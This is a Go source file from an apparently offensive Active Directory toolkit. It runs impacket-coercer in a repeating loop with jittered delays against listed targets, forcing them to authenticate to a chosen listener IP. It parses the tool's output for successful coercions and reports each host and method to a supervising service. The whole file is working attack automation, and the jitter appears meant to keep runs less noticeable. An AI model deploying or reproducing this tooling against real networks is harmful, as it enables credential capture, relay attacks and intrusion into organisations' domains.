package runtime

import (
	"bufio"
	"context"
	"math/rand"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"adpack/core"
)

var coercerLineRe = regexp.MustCompile(`(?i)(?:coerci.n\s+(?:triggered\s+against|success)|[+]?\s*(?:Successfully\s+)?Coerced)\s+(\S+)(?:\s+via\s+\S+)?(?:\s+at\s+\S+(?:\s+\S+)?)?(?:\s+Method:\s+\S+)?`)

var (
	methodViaRe    = regexp.MustCompile(`(?i)\bvia\s+(\S+)`)
	methodLabelRe  = regexp.MustCompile(`(?i)Method:\s*(\S+)`)
	protoBracketRe = regexp.MustCompile(`(\w+)\s+coerci.n`)
)

// CoercerConfig carries parameters for running impacket-coercer.
// This is the runtime-internal version; core.CoercerConfig adds supervisor fields.
type CoercerConfig struct {
	SourceLabel string
	InterfaceIP string
	Targets     []string
	Methods     []string
	Delay       time.Duration
}

// DefaultCoercerConfig returns a minimal sensible configuration.
func DefaultCoercerConfig(interfaceIP string, targets []string) CoercerConfig {
	return CoercerConfig{
		InterfaceIP: interfaceIP,
		Targets:     targets,
		Methods:     []string{},
		Delay:       60 * time.Second,
	}
}

// buildCoercerArgs converts config to impacket-coercer CLI args.
func buildCoercerArgs(cfg CoercerConfig) []string {
	var args []string

	if cfg.InterfaceIP != "" {
		args = append(args, "-l", cfg.InterfaceIP)
	}
	for _, t := range cfg.Targets {
		args = append(args, "-t", t)
	}
	for _, m := range cfg.Methods {
		args = append(args, "-m", m)
	}
	args = append(args, "--timeout", "10")

	return args
}

// startCoercer spawns impacket-coercer in a goroutine loop. Each round:
//  1. Builds args and spawns the process
//  2. Pipes stdout to the returned channel line-by-line
//  3. Waits for the process to finish
//  4. Sleeps cfg.Delay with random jitter (±30%)
//  5. On context cancellation, exits the loop
//
// Does NOT return *exec.Cmd because processes are ephemeral (new one per round).
func startCoercer(ctx context.Context, cfg CoercerConfig) (<-chan string, func() error, error) {
	lines := make(chan string, 64)
	ctx, cancel := context.WithCancel(ctx)

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(lines)

		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			args := buildCoercerArgs(cfg)
			cmd := exec.CommandContext(ctx, "impacket-coercer", args...)

			stdout, err := cmd.StdoutPipe()
			if err != nil {
				select {
				case <-ctx.Done():
					return
				case <-time.After(time.Second):
				}
				continue
			}

			if err := cmd.Start(); err != nil {
				select {
				case <-ctx.Done():
					return
				case <-time.After(time.Second):
				}
				continue
			}

			scanner := bufio.NewScanner(stdout)
			for scanner.Scan() {
				select {
				case lines <- scanner.Text():
				case <-ctx.Done():
					return
				}
			}

			cmd.Wait()

			jitter := time.Duration(rand.Int63n(int64(cfg.Delay)/3) - int64(cfg.Delay)/6)
			sleepFor := cfg.Delay + jitter

			select {
			case <-time.After(sleepFor):
			case <-ctx.Done():
				return
			}
		}
	}()

	stop := func() error {
		cancel()
		return nil
	}

	return lines, stop, nil
}

// parseCoercerLine extracts host and method from a coercer stdout line.
// Returns ("", "", false) for lines that don't match or contain failure indicators.
func parseCoercerLine(line string) (host, method string, ok bool) {
	if strings.Contains(strings.ToLower(line), "fail") {
		return "", "", false
	}

	m := coercerLineRe.FindStringSubmatch(line)
	if len(m) < 2 || m[1] == "" {
		return "", "", false
	}

	host = strings.TrimRight(m[1], "!")
	ok = true

	if vm := methodViaRe.FindStringSubmatch(line); len(vm) >= 2 {
		method = strings.ToUpper(vm[1])
		return
	}

	if mm := methodLabelRe.FindStringSubmatch(line); len(mm) >= 2 {
		method = strings.ToUpper(mm[1])
		return
	}

	if pm := protoBracketRe.FindStringSubmatch(line); len(pm) >= 2 {
		method = strings.ToUpper(pm[1])
	}

	return
}

// NewCoercerService creates a configured ManagedService backed by impacket-coercer.
func NewCoercerService(id, label string, cfg CoercerConfig) *core.ManagedService {
	svc := &core.ManagedService{
		ID:    id,
		Type:  core.ServiceCoercion,
		Label: label,
		State: core.ServiceStopped,
		Config: map[string]any{
			"interface_ip": cfg.InterfaceIP,
			"targets":      cfg.Targets,
			"methods":      cfg.Methods,
			"delay":        cfg.Delay,
			"source_label": cfg.SourceLabel,
			"_auth_count":  0,
		},
		ValidUntil: time.Now().Add(4 * time.Hour),
		Events:     make(chan core.ServiceEvent, 64),
	}

	svc.StopFn = func() error {
		return nil
	}

	return svc
}

// StartCoercerService starts a registered coercer service in a goroutine.
func StartCoercerService(svc *core.ManagedService, cfg CoercerConfig, parentCtx context.Context) error {
	ctx, cancel := context.WithCancel(parentCtx)

	lines, stop, err := startCoercer(ctx, cfg)
	if err != nil {
		cancel()
		return err
	}

	svc.Config["_cancel"] = cancel
	svc.StopFn = func() error {
		cancel()
		return stop()
	}
	svc.State = core.ServiceRunning
	svc.LastHeartbeat = time.Now()

	go func() {
		for line := range lines {
			for _, target := range cfg.Targets {
				svc.Events <- core.ServiceEvent{
					Type:      core.EvCoerceAttempt,
					ServiceID: svc.ID,
					Service:   core.ServiceCoercion,
					Timestamp: time.Now(),
					Data: map[string]any{
						"target": target,
						"raw":    line,
					},
				}
			}

			if host, method, ok := parseCoercerLine(line); ok {
				svc.Events <- core.ServiceEvent{
					Type:      core.EvCoerceSuccess,
					ServiceID: svc.ID,
					Service:   core.ServiceCoercion,
					Timestamp: time.Now(),
					Data: map[string]any{
						"host":   host,
						"method": method,
						"raw":    line,
					},
				}
			}
		}
		svc.State = core.ServiceStopped
	}()

	return nil
}
